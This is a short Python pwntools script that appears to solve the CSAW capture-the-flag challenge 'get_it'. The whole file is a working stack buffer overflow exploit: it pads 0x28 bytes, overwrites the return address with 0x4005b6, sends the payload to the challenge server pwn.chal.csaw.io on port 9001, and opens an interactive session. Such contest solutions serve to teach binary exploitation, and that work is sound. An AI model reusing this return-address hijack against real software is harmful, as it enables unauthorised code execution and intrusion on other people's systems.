#!/usr/bin/env python2
from pwn import *
#from mypwntools import * # ~/workspace/tools/mypwntools
# shellcodes['binsh32']
# gethex(string)

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process("./get_it")
p = remote('pwn.chal.csaw.io', 9001)
"""
gdb.attach(p, '''
               set follow-fork-mode child
               # breakpoints
           '''
          )
          """
target = p64(0x4005b6)
payload = 'A'*0x28 + target
with open('payload_2', 'w') as f:
    f.write(payload)
p.sendline(payload)

p.interactive()

